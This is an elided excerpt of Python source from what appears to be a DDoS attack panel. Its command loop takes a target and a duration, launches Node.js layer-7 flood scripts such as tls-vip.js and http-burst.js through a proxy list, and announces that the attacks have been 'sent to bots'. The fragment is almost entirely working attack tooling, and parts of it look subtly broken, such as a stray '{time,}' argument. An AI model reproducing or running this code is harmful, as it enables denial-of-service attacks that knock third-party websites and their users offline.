    ...
    while True:
        ...
        if sinput == "layer7" or sinput == "l7":
            ...
            try:
                target = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd l7 && screen -dm node tls-vip.js {target} {time} 64 10 proxy.txt')
                print("𝘼𝙡𝙡 𝙖𝙩𝙩𝙖𝙘𝙠𝙨 𝙝𝙖𝙫𝙚 𝙗𝙚𝙚𝙣 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙨𝙚𝙣𝙩 𝙩𝙤 𝙗𝙤𝙩𝙨 [⚠]")
            except ValueError:
                layer4()
            except IndexError:
            ...
            try:
                target = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd l7 && screen -dm node http-burst.js {target} {time,} 10 post proxy.txt 64')
                print("𝘼𝙡𝙡 𝙖𝙩𝙩𝙖𝙘𝙠𝙨 𝙝𝙖𝙫𝙚 𝙗𝙚𝙚𝙣 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙨𝙚𝙣𝙩 𝙩𝙤 𝙗𝙤𝙩𝙨 [⚠]")
            except ValueError:
                layer7()
            except IndexError:
            ...
            try:
                target = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd l7 && screen -dm node http-burst.js {target} {time} 10 proxy.txt 64 10')
                print("𝘼𝙡𝙡 𝙖𝙩𝙩𝙖𝙘𝙠𝙨 𝙝𝙖𝙫𝙚 𝙗𝙚𝙚𝙣 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙨𝙚𝙣𝙩 𝙩𝙤 𝙗𝙤𝙩𝙨 [⚠]")
            except ValueError:
                layer7()
            except IndexError:
            ...
            try:
                target = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd l7 && screen -dm node slam-server.js {target} {time} 64 10 proxy.txt')
                print("𝘼𝙡𝙡 𝙖𝙩𝙩𝙖𝙘𝙠𝙨 𝙝𝙖𝙫𝙚 𝙗𝙚𝙚𝙣 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙨𝙚𝙣𝙩 𝙩𝙤 𝙗𝙤𝙩𝙨 [⚠]")
            except ValueError:
                layer7()
            except IndexError:
            ...
            try:
                target = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd l7 && screen -dm node http-god.js {target} {time} 32 10 proxy.txt')
                print("𝘼𝙡𝙡 𝙖𝙩𝙩𝙖𝙘𝙠𝙨 𝙝𝙖𝙫𝙚 𝙗𝙚𝙚𝙣 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙨𝙚𝙣𝙩 𝙩𝙤 𝙗𝙤𝙩𝙨 [⚠]")
            except ValueError:
                layer7()
            except IndexError:
